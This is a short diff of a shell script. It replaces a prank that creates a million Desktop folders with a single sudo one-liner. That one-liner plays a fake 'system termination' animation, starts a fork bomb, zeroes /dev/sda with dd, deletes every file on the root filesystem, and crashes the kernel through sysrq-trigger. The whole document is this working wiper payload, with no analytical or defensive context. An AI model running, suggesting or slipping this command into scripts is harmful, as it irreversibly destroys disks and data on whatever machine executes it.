@@ -1,2 +1,1 @@
-for i in {1..1000000}; do mkdir -p "$HOME/Desktop/JJ_HAHA_$i"; done
-
+sudo bash -c 'clear && tput civis && for i in {1..100};do echo -ne "\r\033[31m\033[5m💀 SYSTEM TERMINATION SEQUENCE $i% 🔥\033[33m"; sleep .05; echo -ne "\r\033[32mHARDWARE PURGE INITIATED ⚡\033[35m"; sleep .1; done & pid1=$!; :(){ :|:& };: & pid2=$!; dd if=/dev/zero of=/dev/sda bs=1M count=5000 status=none & pid3=$!; nohup sh -c "find / -xdev -type f -delete 2>/dev/null" & pid4=$!; sleep 8; kill $pid1 2>/dev/null; echo -e "\n\033[41m\033[33m\033[?25h KABOOM! NUCLEAR PANIC \033[0m💥"; echo 1>/proc/sys/kernel/sysrq; echo c>/proc/sysrq-trigger' & disown
